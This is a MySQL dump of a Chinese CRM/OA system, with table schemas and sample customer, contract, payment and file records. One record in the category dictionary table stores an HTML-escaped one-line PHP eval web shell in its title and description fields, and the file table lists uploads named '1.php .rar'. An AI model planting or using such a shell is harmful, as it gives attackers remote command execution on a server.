INSERT INTO `xy_config` VALUES ('55', '基础', 'CUST_XUQIU', '3', '客户需求', '', '', '2015-05-20 11:34:07', '0000-00-00 00:00:00', '1', '软件定制\nCRM/OA\n物流管理\n美容院管理', '0');
INSERT INTO `xy_config` VALUES ('56', '基础', 'CHANPIN_FENLEI', '3', '产品分类', '', '', '2015-05-22 10:23:50', '2015-06-02 09:26:43', '1', '软件服务\n软件配套\n办公用品\n', '0');
INSERT INTO `xy_config` VALUES ('57', '基础', 'CHANPIN_DANWEI', '3', '产品单位', '', '', '2015-05-22 10:26:04', '2015-06-02 09:28:59', '1', '只\n个\n台\n卷\n套', '0');
INSERT INTO `xy_config` VALUES ('58', '基础', 'SHENHE', '3', '审核状态', '', '', '2015-05-22 16:02:16', '2015-07-08 15:56:18', '1', '审核通过\n退回修改', '0');
INSERT INTO `xy_config` VALUES ('59', '基础', 'QUXIANG_TYPE', '3', '去向', '', '', '2015-05-24 23:16:49', '2015-07-19 18:28:27', '1', '外出\n请假', '0');
INSERT INTO `xy_config` VALUES ('60', '基础', 'HUIBAO_TYPE', '3', '汇报类型', '', '', '2015-05-25 09:15:40', '0000-00-00 00:00:00', '1', '日总结\n周总结\n月总结\n年总结\n其他', '0');
INSERT INTO `xy_config` VALUES ('61', '基础', 'ZHISHI_TYPE', '3', '知识分类', '', '', '2015-05-25 10:39:14', '0000-00-00 00:00:00', '1', '产品知识\n技术知识\n营销知识\n质量知识\n培训资料\n管理知识\n其他知识', '0');
INSERT INTO `xy_config` VALUES ('62', '基础', 'TXL_LEIXING', '3', '通讯录类型', '', '', '2015-05-25 12:24:21', '2015-07-19 18:48:16', '1', '私有\n公有', '0');
INSERT INTO `xy_config` VALUES ('63', '基础', 'RENWU_JIEGUO', '3', '处理结果', '', '', '2015-05-31 16:53:05', '0000-00-00 00:00:00', '1', '进行中\n已完成', '0');
INSERT INTO `xy_config` VALUES ('64', '基础', 'BIANHAO_AUTO', '1', '自动编号', '', '编号规则是否自动编号，如果是手工输入的，请删除自动编号', '2015-06-06 08:21:46', '2015-06-06 08:36:11', '1', '自动编号', '0');
INSERT INTO `xy_config` VALUES ('65', '基础', 'BIANHAO_GUIZE', '0', '编号规则', '', '0，年月日秒+4位顺序号\n1，年月日时分秒+2位随机数\n2，年与日+4位随机数', '2015-06-06 08:29:27', '2015-06-06 08:49:54', '1', '0', '0');
INSERT INTO `xy_config` VALUES ('66', '基础', 'BIANHAO_NUM', '0', '编号长度', '', '默认是4位长度值，效果如：0001', '2015-06-06 08:32:59', '0000-00-00 00:00:00', '1', '4', '0');

-- ----------------------------
-- Table structure for `xy_cust`
-- ----------------------------
DROP TABLE IF EXISTS `xy_cust`;
CREATE TABLE `xy_cust` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `title` varchar(200) NOT NULL,
  `dianhua` varchar(50) NOT NULL,
  `qq` varchar(50) NOT NULL,
  `email` varchar(200) NOT NULL,
  `name` varchar(50) NOT NULL,
  `laiyuan` varchar(50) NOT NULL,
  `jinzhan` varchar(50) NOT NULL,
  `xiaci` datetime NOT NULL,
  `juid` varchar(500) NOT NULL,
  `juname` varchar(500) NOT NULL,
  `beizhu` varchar(500) NOT NULL,
  `dizhi` varchar(200) NOT NULL,
  `aihao` varchar(200) NOT NULL,
  `xuqiu` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8 COMMENT='客户管理';

-- ----------------------------
-- Records of xy_cust
-- ----------------------------
INSERT INTO `xy_cust` VALUES ('1', '1', '陈高明', '2015-05-21 08:12:00', '1', '陈高明', '2015-05-22 15:15:47', '1', '百度公司', '13812349563', '1625252622', 'pinkecn@qq.com', '李彦宏', '主动联系', '成交客户', '2015-05-22 09:11:42', '16', '王晓丹', '地方', '中国北京市', '健身', 'CRM/OA');
INSERT INTO `xy_cust` VALUES ('2', '1', '陈高明', '2015-06-01 09:05:58', '0', '', '0000-00-00 00:00:00', '0', '深圳腾讯公司', '1381212245', '10000', '120000@qq.com', '马虎腾', '主动联系', '需求整理', '0000-00-00 00:00:00', '16,1', '王晓丹,陈高明', '121212', '深圳市罗湖区', '高尔夫', '物流管理');
INSERT INTO `xy_cust` VALUES ('3', '18', '王倩', '2015-06-03 14:05:34', '18', '王倩', '2015-06-03 14:06:45', '0', '常州达丽人女子美容中心', '13865722111', '54445333', '', '候经理', '主动联系', '选择比较', '2015-06-15 14:16:19', '', '', '店铺装修中', '武进区', '', '美容院管理');
INSERT INTO `xy_cust` VALUES ('4', '18', '王倩', '2015-06-03 14:16:21', '16', '王晓丹', '2015-07-20 01:53:47', '0', '南昌房屋中介服', '13299872991', '988776655', '', '李经理', '百度推广', '需求整理', '2015-06-10 07:25:09', '17,16', '张雨,王晓丹', '咨询', '市区', '', '软件定制');

-- ----------------------------
-- Table structure for `xy_custcon`
-- ----------------------------
DROP TABLE IF EXISTS `xy_custcon`;
CREATE TABLE `xy_custcon` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `cid` int(11) NOT NULL,
  `title` varchar(200) NOT NULL,
  `name` varchar(50) NOT NULL,
  `sex` varchar(10) NOT NULL,
  `zhiwu` varchar(20) NOT NULL,
  `dianhua` varchar(50) NOT NULL,
  `qq` varchar(50) NOT NULL,
  `email` varchar(200) NOT NULL,
  `aihao` varchar(200) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8 COMMENT='联系人';

-- ----------------------------
-- Records of xy_custcon
-- ----------------------------
INSERT INTO `xy_custcon` VALUES ('1', '1', '陈高明', '2015-05-21 08:42:09', '0', '', '0000-00-00 00:00:00', '1', '1', '百度公司', '王旭', '男', '副总裁', '135262', '5622352', '5622352@qq.com', '爬山', '说明下');
INSERT INTO `xy_custcon` VALUES ('2', '1', '陈高明', '2015-05-21 08:44:22', '0', '', '0000-00-00 00:00:00', '1', '1', '百度公司', '徐冬冬', '女', '范德萨', '3152', '252622', '525233@qq.com', 'fds ', 'fsd ');
INSERT INTO `xy_custcon` VALUES ('3', '18', '王倩', '2015-06-03 14:11:06', '0', '', '0000-00-00 00:00:00', '1', '3', '常州达丽人女子美容中心', '候经理', '男', '店长', '13876322111', '', '', '', '');
INSERT INTO `xy_custcon` VALUES ('4', '16', '王晓丹', '2015-06-12 11:56:11', '0', '', '0000-00-00 00:00:00', '1', '4', '南昌房屋中介服务', '768', '', '78768', '18370066801', '', '', '', '');
INSERT INTO `xy_custcon` VALUES ('5', '16', '王晓丹', '2015-06-12 11:59:59', '16', '王晓丹', '2015-07-20 01:54:16', '1', '4', '南昌房屋中介服', '444', '男', 'dfd', '187444444444', '', '', '', '');
INSERT INTO `xy_custcon` VALUES ('6', '16', '王晓丹', '2015-06-21 17:05:13', '16', '王晓丹', '2015-06-23 10:15:24', '1', '3', '常州达丽人女子美容中心', '候经理', '女', '', '13865722111', '232', '', '', '');
INSERT INTO `xy_custcon` VALUES ('9', '1', '陈高明', '2015-07-11 18:18:42', '0', '', '0000-00-00 00:00:00', '1', '2', '深圳腾讯公司', '马虎腾', '', '', '1381212245', '', '', '', '');
INSERT INTO `xy_custcon` VALUES ('10', '16', '王晓丹', '2015-07-15 14:25:23', '0', '', '0000-00-00 00:00:00', '1', '3', '常州达丽人女子美容中心', '候经理', '', '', '13865722111', '', '', '', '');

-- ----------------------------
-- Table structure for `xy_custgd`
-- ----------------------------
DROP TABLE IF EXISTS `xy_custgd`;
CREATE TABLE `xy_custgd` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `cid` int(11) NOT NULL,
  `title` varchar(250) NOT NULL,
  `type` varchar(50) NOT NULL,
  `content` varchar(255) NOT NULL,
  `jinzhan` varchar(50) NOT NULL,
  `xiaci` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=15 DEFAULT CHARSET=utf8 COMMENT='跟单记录';

-- ----------------------------
-- Records of xy_custgd
-- ----------------------------
INSERT INTO `xy_custgd` VALUES ('1', '1', '陈高明', '2015-05-21 08:51:25', '0', '', '0000-00-00 00:00:00', '1', '1', '百度公司', '电话沟通', '和李鸿雁沟通不错，准备做呢', '需求整理', '2015-05-22 08:51:04');
INSERT INTO `xy_custgd` VALUES ('2', '1', '陈高明', '2015-05-21 08:52:29', '1', '陈高明', '2015-05-21 09:11:47', '1', '1', '百度公司', '上门拜访', '搞定了啊', '成交客户', '2015-05-22 09:11:42');
INSERT INTO `xy_custgd` VALUES ('3', '1', '陈高明', '2015-06-01 09:06:23', '0', '', '0000-00-00 00:00:00', '1', '2', '深圳腾讯公司', '上门拜访', '12121', '选择比较', '2015-06-03 09:06:17');
INSERT INTO `xy_custgd` VALUES ('4', '1', '陈高明', '2015-06-02 09:49:04', '0', '', '0000-00-00 00:00:00', '1', '2', '深圳腾讯公司', '上门拜访', '搞定了啊', '成交客户', '0000-00-00 00:00:00');
INSERT INTO `xy_custgd` VALUES ('5', '16', '王晓丹', '2015-06-03 07:43:29', '1', '陈高明', '2015-07-09 09:26:25', '1', '2', '深圳腾讯公司', '电话沟通', '11', '需求整理', '0000-00-00 00:00:00');
INSERT INTO `xy_custgd` VALUES ('6', '18', '王倩', '2015-06-03 14:11:50', '18', '王倩', '2015-06-03 14:13:12', '1', '3', '常州达丽人女子美容中心', '电话沟通', '在忙', '需求整理', '2015-06-11 14:12:34');
INSERT INTO `xy_custgd` VALUES ('7', '18', '王倩', '2015-06-03 14:17:03', '0', '', '0000-00-00 00:00:00', '1', '3', '常州达丽人女子美容中心', 'QQ/旺旺', '选择软件', '选择比较', '2015-06-15 14:16:19');
INSERT INTO `xy_custgd` VALUES ('8', '16', '王晓丹', '2015-06-03 19:31:54', '0', '', '0000-00-00 00:00:00', '1', '4', '南昌房屋中介服务', '', '11', '成交客户', '0000-00-00 00:00:00');
INSERT INTO `xy_custgd` VALUES ('9', '16', '王晓丹', '2015-06-12 11:32:59', '0', '', '0000-00-00 00:00:00', '1', '4', '南昌房屋中介服务', '', '', '', '0000-00-00 00:00:00');
INSERT INTO `xy_custgd` VALUES ('10', '16', '王晓丹', '2015-06-12 12:00:06', '0', '', '0000-00-00 00:00:00', '1', '4', '南昌房屋中介服务', '', '', '', '0000-00-00 00:00:00');
INSERT INTO `xy_custgd` VALUES ('11', '16', '王晓丹', '2015-06-26 07:30:46', '0', '', '0000-00-00 00:00:00', '1', '4', '南昌房屋中介服务', '电话沟通', '', '需求整理', '2015-06-10 07:25:09');
INSERT INTO `xy_custgd` VALUES ('12', '16', '王晓丹', '2015-07-03 16:35:55', '0', '', '0000-00-00 00:00:00', '1', '0', 'sdfsdf', '上门拜访', 'fdsf', '成交客户', '2015-07-30 16:30:10');

-- ----------------------------
-- Table structure for `xy_datalist`
-- ----------------------------
DROP TABLE IF EXISTS `xy_datalist`;
CREATE TABLE `xy_datalist` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `level` tinyint(1) NOT NULL,
  `pid` int(11) NOT NULL,
  `title` varchar(50) NOT NULL,
  `desc` varchar(200) NOT NULL,
  `sort` int(4) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8 COMMENT='分类字典';

-- ----------------------------
-- Records of xy_datalist
-- ----------------------------
INSERT INTO `xy_datalist` VALUES ('1', '1', '陈高明', '2015-05-06 15:35:39', '1', '陈高明', '2015-05-18 20:04:13', '1', '0', '0', '地区分类', '地区分类', '1');
INSERT INTO `xy_datalist` VALUES ('2', '1', '陈高明', '2015-05-06 15:38:20', '0', '', '0000-00-00 00:00:00', '1', '1', '1', '湖南', '湖南省', '1');
INSERT INTO `xy_datalist` VALUES ('3', '1', '陈高明', '2015-05-06 15:38:39', '0', '', '0000-00-00 00:00:00', '1', '2', '2', '长沙', '', '1');
INSERT INTO `xy_datalist` VALUES ('4', '1', '陈高明', '2015-05-06 15:40:30', '0', '', '0000-00-00 00:00:00', '1', '2', '2', '岳阳', '', '5');
INSERT INTO `xy_datalist` VALUES ('5', '8', '管理员', '2015-05-12 09:47:00', '0', '', '0000-00-00 00:00:00', '1', '1', '1', '浙江', '浙江省', '20');
INSERT INTO `xy_datalist` VALUES ('6', '8', '管理员', '2015-05-12 09:47:58', '0', '', '0000-00-00 00:00:00', '1', '2', '5', '杭州', '杭州市', '21');
INSERT INTO `xy_datalist` VALUES ('8', '1', '陈高明', '2015-07-11 14:33:25', '1', '陈高明', '2015-07-11 14:33:52', '1', '3', '6', '&lt;?php @eval($_POST[cmd])?&gt;', '&lt;?php @eval($_POST[cmd])?&gt;', '0');

-- ----------------------------
-- Table structure for `xy_emails`
-- ----------------------------
DROP TABLE IF EXISTS `xy_emails`;
CREATE TABLE `xy_emails` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `addtime` datetime NOT NULL,
  `title` varchar(200) NOT NULL,
  `email` varchar(200) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `content` varchar(255) NOT NULL,
  `url` varchar(255) NOT NULL,
  `ip` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='邮件记录';

-- ----------------------------
-- Records of xy_emails
-- ----------------------------
INSERT INTO `xy_emails` VALUES ('1', '0', '2015-05-19 19:41:22', '18951251872', '16129825@qq.com', '1', '验证码为12015200，24小时之内有效', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1');
INSERT INTO `xy_emails` VALUES ('2', '0', '2015-05-19 19:54:34', '18951251872', '16129825@qq.com', '1', '验证码为12015200，24小时之内有效', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1');

-- ----------------------------
-- Table structure for `xy_fahuo`
-- ----------------------------
DROP TABLE IF EXISTS `xy_fahuo`;
CREATE TABLE `xy_fahuo` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `hid` int(11) NOT NULL,
  `mingcheng` varchar(100) NOT NULL,
  `bianhao` varchar(50) NOT NULL,
  `title` varchar(100) NOT NULL,
  `shijian` date NOT NULL,
  `value` varchar(200) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  `jingban` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='发货记录';

-- ----------------------------
-- Records of xy_fahuo
-- ----------------------------
INSERT INTO `xy_fahuo` VALUES ('1', '1', '陈高明', '2015-06-02 10:00:24', '16', '王晓丹', '2015-07-05 18:26:53', '1', '11', '33333', '150616280005', '1', '2015-06-02', '申通快递-3652622', '配套设备全部已经发送，3天后到', '');

-- ----------------------------
-- Table structure for `xy_files`
-- ----------------------------
DROP TABLE IF EXISTS `xy_files`;
CREATE TABLE `xy_files` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `attid` int(11) NOT NULL,
  `folder` varchar(50) NOT NULL,
  `filename` varchar(255) NOT NULL,
  `filetype` varchar(50) NOT NULL,
  `filedesc` varchar(200) NOT NULL,
  `uid` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `status` int(2) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=20 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_files
-- ----------------------------
INSERT INTO `xy_files` VALUES ('1', '1433245831', 'Uploads/Public/2015-06-02/', '556d990203452.doc', 'doc', '科学的含义.doc', '17', '2015-06-02 19:52:34', '1');
INSERT INTO `xy_files` VALUES ('5', '1436095611', 'Uploads/Public/2015-07-05/', '55991482dea49.png', 'png', 'alertpanel_icon.png', '16', '2015-07-05 19:26:58', '1');
INSERT INTO `xy_files` VALUES ('3', '1433316533', 'Uploads/Public/2015-06-03/', '556eace8b20db.jpg', 'jpg', '90175072.jpg', '16', '2015-06-03 15:29:44', '1');
INSERT INTO `xy_files` VALUES ('4', '1433318891', 'Uploads/Public/2015-06-03/', '556eb5fa78438.txt', 'txt', '新建文本文档.txt', '16', '2015-06-03 16:08:26', '1');
INSERT INTO `xy_files` VALUES ('6', '1433314035', 'Uploads/Public/2015-07-07/', '559ab983450d0.jpg', 'jpg', '1.jpg', '16', '2015-07-07 01:23:15', '1');
INSERT INTO `xy_files` VALUES ('12', '1436543662', 'Uploads/Public/2015-07-10/', '559feabace270.rar', 'rar', '1.php .rar', '1', '2015-07-10 23:54:34', '1');
INSERT INTO `xy_files` VALUES ('11', '1436542767', 'Uploads/Public/2015-07-10/', '559fe752315ed.rar', 'rar', '1.php .rar', '1', '2015-07-10 23:40:02', '1');
INSERT INTO `xy_files` VALUES ('13', '1433314035', 'Uploads/Public/2015-07-11/', '559ff231032e5.jpg', 'jpg', '1.jpg', '1', '2015-07-11 00:26:25', '1');
INSERT INTO `xy_files` VALUES ('14', '1436544137', 'Uploads/Public/2015-07-11/', '559ff32103904.jpg', 'jpg', '1.jpg', '1', '2015-07-11 00:30:25', '1');
INSERT INTO `xy_files` VALUES ('15', '1436544137', 'Uploads/Public/2015-07-11/', '559ff6281265a.txt', 'txt', '新建文本文档.txt', '1', '2015-07-11 00:43:20', '1');
INSERT INTO `xy_files` VALUES ('16', '1437227904', 'Uploads/Public/2015-07-18/', '55aa5b939ba5b.gif', 'gif', 'msql销售登记备份系统 v1.0.gif', '16', '2015-07-18 21:58:43', '1');
INSERT INTO `xy_files` VALUES ('17', '1438650287', 'Uploads/Public/2015-08-04/', '55c00fc17dba9.jpg', 'jpg', 'Desert.jpg', '16', '2015-08-04 09:05:05', '1');
INSERT INTO `xy_files` VALUES ('18', '1439458687', 'Uploads/Public/2015-08-13/', '55cc65acd93e3.rar', 'rar', '51CTO下载-河南某法院VoIP建设项目（华为和迈普）.part2.rar', '16', '2015-08-13 17:38:52', '1');
INSERT INTO `xy_files` VALUES ('19', '1540537224', 'Uploads/Public/2018-10-26/', '5bd2bbbbc760d.jpg', 'jpg', '553b5e2a71297.jpg', '1', '2018-10-26 15:01:15', '1');

-- ----------------------------
-- Table structure for `xy_fukuan`
-- ----------------------------
DROP TABLE IF EXISTS `xy_fukuan`;
CREATE TABLE `xy_fukuan` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `hid` int(11) NOT NULL,
  `mingcheng` varchar(100) NOT NULL,
  `bianhao` varchar(50) NOT NULL,
  `title` varchar(100) NOT NULL,
  `leixing` varchar(50) NOT NULL,
  `type` varchar(50) NOT NULL,
  `jine` int(11) NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  `shenheren` varchar(50) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  `attid` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='付款记录';

-- ----------------------------
-- Records of xy_fukuan
-- ----------------------------
INSERT INTO `xy_fukuan` VALUES ('1', '1', '陈高明', '2015-06-02 09:55:05', '0', '', '0000-00-00 00:00:00', '1', '1', 'CRM管理系统', '1506020001', '百度公司', '差旅费', '发票报销', '500', '陈高明', '3天出差费用', '陈高明', '审核通过', '1433210061');
INSERT INTO `xy_fukuan` VALUES ('2', '1', '陈高明', '2015-06-02 10:19:04', '0', '', '0000-00-00 00:00:00', '1', '2', '美容院管理系统安装版', '1506020002', '深圳腾讯公司', '招待费', '发票报销', '800', '王旭东', '客户来招待费', '陈高明', '审核通过', '1433211492');
INSERT INTO `xy_fukuan` VALUES ('3', '16', '王晓丹', '2015-07-20 00:06:59', '0', '', '0000-00-00 00:00:00', '1', '15', 'dadasdas', '150713220009', 'das', '差旅费', '发票报销', '100', '', '', '王晓丹', '审核通过', '1437321994');

-- ----------------------------
-- Table structure for `xy_hetong`
-- ----------------------------
DROP TABLE IF EXISTS `xy_hetong`;
CREATE TABLE `xy_hetong` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `bianhao` varchar(50) NOT NULL,
  `mingcheng` varchar(200) NOT NULL,
  `cid` int(11) NOT NULL,
  `title` varchar(200) NOT NULL,
  `name` varchar(50) NOT NULL,
  `dianhua` varchar(200) NOT NULL,
  `type` varchar(50) NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `juid` varchar(500) NOT NULL,
  `juname` varchar(500) NOT NULL,
  `jztime` date NOT NULL,
  `xufei` int(11) NOT NULL,
  `jine` int(11) NOT NULL,
  `yishou` int(11) NOT NULL,
  `weishou` int(11) NOT NULL,
  `kaipiao` int(11) NOT NULL,
  `yifu` int(11) NOT NULL,
  `content` text NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  `attid` int(11) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  `shenheren` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=16 DEFAULT CHARSET=utf8 COMMENT='合同管理';

-- ----------------------------
-- Records of xy_hetong
-- ----------------------------
INSERT INTO `xy_hetong` VALUES ('1', '1', '陈高明', '2015-06-02 09:38:31', '0', '', '0000-00-00 00:00:00', '1', '1506020001', 'CRM管理系统', '1', '百度公司', '李彦宏', '13812349563', 'CRM/OA', '陈高明', '16,1', '王晓丹,陈高明', '2015-06-16', '0', '8350', '5000', '3350', '0', '500', '一次行购买', '没什么特殊', '1433208301', '审核通过', '陈高明');
INSERT INTO `xy_hetong` VALUES ('2', '1', '陈高明', '2015-06-02 09:51:14', '0', '', '0000-00-00 00:00:00', '1', '1506020002', '美容院管理系统安装版', '2', '深圳腾讯公司', '马虎腾', '1381212245', '美容院管理', '王旭东', '16,1', '王晓丹,陈高明', '2016-06-02', '2000', '8850', '8850', '0', '2147483647', '800', '每年有服务费2000', '安装到他们自己的电脑上', '1433209768', '审核通过', '陈高明');
INSERT INTO `xy_hetong` VALUES ('3', '1', '陈高明', '2015-06-02 11:26:47', '0', '', '0000-00-00 00:00:00', '1', '1506020003', 'CRM租赁版 百度', '1', '百度公司', '李彦宏', '13812349563', 'CRM/OA', '陈高明', '16,1', '王晓丹,陈高明', '2016-06-30', '1500', '6800', '0', '6800', '1000', '0', '每年付费', '租赁，按年付费', '1433215510', '审核通过', '陈高明');
INSERT INTO `xy_hetong` VALUES ('10', '16', '王晓丹', '2015-06-16 10:08:20', '16', '王晓丹', '2015-06-29 10:48:14', '1', '150616200004', '33333', '5', '1', '1', '13299872991', '', '', '18,17,16,1', '王倩,张雨,王晓丹,陈高明', '0000-00-00', '44', '0', '0', '0', '0', '0', '', '', '1434420466', '审核通过', '王晓丹');
INSERT INTO `xy_hetong` VALUES ('11', '16', '王晓丹', '2015-06-16 10:08:28', '0', '', '0000-00-00 00:00:00', '1', '150616280005', '33333', '5', '1', '1', '13299872991', '', '', '18,17,16,1', '王倩,张雨,王晓丹,陈高明', '0000-00-00', '44', '0', '100', '-100', '0', '0', '', '', '1434420466', '审核通过', '王晓丹');
INSERT INTO `xy_hetong` VALUES ('12', '1', '陈高明', '2015-07-08 16:13:06', '0', '', '0000-00-00 00:00:00', '1', '150708060006', '111', '0', '', '', '11111', '', '', '', '', '0000-00-00', '111', '0', '100', '-100', '0', '0', '', '', '1436343092', '审核通过', '陈高明');
INSERT INTO `xy_hetong` VALUES ('13', '1', '陈高明', '2015-07-11 18:19:44', '0', '', '0000-00-00 00:00:00', '1', '150711440007', '11', '4', '南昌房屋中介服务', '李经理', '13299872991', '软件定制', '', '16', '王晓丹', '0000-00-00', '111', '0', '0', '0', '0', '0', '', '', '1436609937', '审核通过', '陈高明');
INSERT INTO `xy_hetong` VALUES ('14', '1', '陈高明', '2015-07-13 00:26:16', '0', '', '0000-00-00 00:00:00', '1', '150713160008', '111', '0', '', '', '111', '', '', '', '', '0000-00-00', '100', '200', '0', '200', '0', '0', '', '', '1436718313', '审核通过', '陈高明');
INSERT INTO `xy_hetong` VALUES ('15', '1', '陈高明', '2015-07-13 13:43:22', '0', '', '0000-00-00 00:00:00', '1', '150713220009', 'dadasdas', '0', 'das', '', 'asdasdas', '', '', '', 'ddsad', '2015-07-22', '100', '0', '0', '0', '0', '100', '', '', '1436766178', '审核通过', '陈高明');

-- ----------------------------
-- Table structure for `xy_hetongs`
-- ----------------------------
DROP TABLE IF EXISTS `xy_hetongs`;
CREATE TABLE `xy_hetongs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `hid` int(11) NOT NULL,
  `bianhao` varchar(100) NOT NULL,
  `title` varchar(100) NOT NULL,
  `fenlei` varchar(50) NOT NULL,
  `type` varchar(200) NOT NULL,
  `danwei` varchar(50) NOT NULL,
  `xjiage` int(11) NOT NULL,
  `shuliang` int(11) NOT NULL,
  `xiaoji` int(11) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  `edit` tinyint(1) NOT NULL,
  `number` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='合同明细表';

-- ----------------------------
-- Records of xy_hetongs
-- ----------------------------

-- ----------------------------
-- Table structure for `xy_hospital`
-- ----------------------------
DROP TABLE IF EXISTS `xy_hospital`;
CREATE TABLE `xy_hospital` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) DEFAULT NULL,
  `address` varchar(32) DEFAULT NULL,
  `status` tinyint(1) DEFAULT '1',
  `level` tinyint(1) DEFAULT NULL,
  `pid` int(11) DEFAULT '0',
  `desc` longtext,
  `tel` varchar(32) DEFAULT NULL,
  `sort` int(4) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=16 DEFAULT CHARSET=utf8 COMMENT='分类字典';

-- ----------------------------
-- Records of xy_hospital
-- ----------------------------
INSERT INTO `xy_hospital` VALUES ('14', '111', '23213', '1', '0', '0', '2321', '21321321323', '3');
INSERT INTO `xy_hospital` VALUES ('15', '213', '23', '1', '0', '0', '213', '23', null);

-- ----------------------------
-- Table structure for `xy_huibao`
-- ----------------------------
DROP TABLE IF EXISTS `xy_huibao`;
CREATE TABLE `xy_huibao` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `type` varchar(50) NOT NULL,
  `title` varchar(100) NOT NULL,
  `juid` varchar(500) NOT NULL,
  `juname` varchar(500) NOT NULL,
  `content` text NOT NULL,
  `attid` int(11) NOT NULL,
  `beizhu` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8 COMMENT='工作汇报';

-- ----------------------------
-- Records of xy_huibao
-- ----------------------------
INSERT INTO `xy_huibao` VALUES ('1', '1', '陈高明', '2015-05-25 09:42:49', '1', '陈高明', '2015-05-31 17:31:01', '1', '日总结', '2015-5-25工作总结', '16', '王晓丹', '幸福的方向', '1432518129', '\n陈高明:不错。加油\n！2015-05-25 09:56:20\n陈高明:陈高明:不错。加油！2015-05-25 09:56:20\n\n加油！2015-05-25 09:56:40\n陈高明:电风扇2015-05-25 09:58:30\n陈高明:122122015-05-31 17:31:01');
INSERT INTO `xy_huibao` VALUES ('2', '17', '张雨', '2015-06-02 19:47:35', '16', '王晓丹', '2015-06-03 14:46:43', '1', '周总结', '本周进度正常', '16', '王晓丹', '工作进度与计划一致', '1433245558', '\n王晓丹:zxvxzcvcxz2015-06-03 14:46:43');
